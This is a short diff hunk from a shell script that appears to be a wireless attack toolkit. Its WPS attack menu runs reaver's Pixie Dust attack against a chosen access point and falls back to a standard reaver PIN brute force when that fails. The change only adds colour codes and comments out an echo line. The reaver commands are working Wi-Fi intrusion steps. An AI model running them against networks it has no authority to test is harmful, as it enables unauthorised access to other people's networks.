@@ -5290,15 +5290,18 @@ menuAttacksWPS(){
 		#$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv -K $pixieNumber
 		$reaver -i $interfaceMonitor -b $bssid -c $channel -vv -K $pixieNumber
 		#read pause
+		#pixieFailed="1"
 
 		case "$pixieFailed" in
 	
 			"1")
+			$red
 			echo ""
 			echo ""
 			echo "Pixie Attack Failed! Starting Normal Reaver Attack"
 			echo ""
-			echo ""
+			#echo ""
+			$white
 			$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv
 			;;
 
